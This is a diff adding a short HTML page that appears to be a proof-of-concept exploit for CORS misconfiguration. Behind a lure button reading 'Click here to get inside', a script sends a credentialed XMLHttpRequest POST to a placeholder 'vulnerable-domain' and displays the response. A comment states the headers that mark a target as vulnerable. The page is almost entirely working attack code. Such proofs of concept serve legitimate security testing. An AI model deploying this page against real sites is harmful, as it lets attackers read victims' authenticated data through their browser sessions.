@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<div id="demo"><br>
+<h1>We Welcome Great people like You!!!</h1>
+<button type="button" onclick="loadDoc()">Click here to get inside</button>
+</div>
+
+<script>
+function loadDoc() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      document.getElementById("demo").innerHTML = this.responseText;
+    }
+  };
+  xhttp.open("POST", "http://vulnerable-domain", true);
+  xhttp.withCredentials = true;
+  xhttp.send();
+}
+</script>
+<!--
+<p>If the response contains below Headers then it is Vulnerable</p>
+<font color='red'><p>Access-Control-Allow-Origin: [dynamic url]</p>
+<p>Access-Control-Allow-Credentials: true[works for Cookie and Basic Authentication]</p></font>
+ -->
+</body>
+</html>
